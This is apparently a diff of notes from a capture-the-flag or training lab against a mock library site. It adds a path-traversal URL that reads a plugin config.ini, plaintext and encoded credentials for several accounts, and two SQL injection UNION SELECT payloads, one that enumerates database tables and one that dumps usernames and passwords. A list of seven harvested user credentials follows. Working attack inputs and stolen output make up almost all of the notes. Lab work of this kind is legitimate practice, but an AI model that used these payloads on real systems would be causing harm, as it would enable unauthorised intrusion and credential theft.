@@ -4,3 +4,30 @@ http://107.cybertrial.co.uk/plugins/viewer/view?book=photos/
 bottom of file http://107.cybertrial.co.uk/plugins/viewer/view?book=plugins/wc-auth/config.ini
 wc-libsec-support
 imtrappedinthelibraryhelpme!2000
+
+
+base65 
+guest01
+B6%40d%2CF%3E%2CE
+
+borrower201wc
+%40W%2D%3A%2DDg%2Cc51%2C%28G%2C%40f
+
+staff301wc
+F%2A%28i%26Ahu%2BqG%40L
+
+
+' UNION SELECT table_schema,table_name,column_name,NULL,NULL FROM information_schema.columns WHERE table_schema != 'information_schema' -- 
+wc_borrowers1
+
+' UNION SELECT username,password,NULL,NULL,NULL FROM wc_borrowers1-- 
+
+# base65 decode passwords
+
+harry.smyth		CM%-;1LauQ2eH]D2_t
+jake.peters		GUhLB4>U02/7"b2J-C
+ruth.barnet		G%YJI1i@AHBkVE@3G2q
+jane.richards		E+WiD2)oJpAi;GS@po
+terry.edwards		ChIg&DDs@G%rflAnV
+richard.bakewell	B5MEuE]GpbG%P3)@K
+barry.blacksmith	F(T/C3&>#V@WQ'=1M-
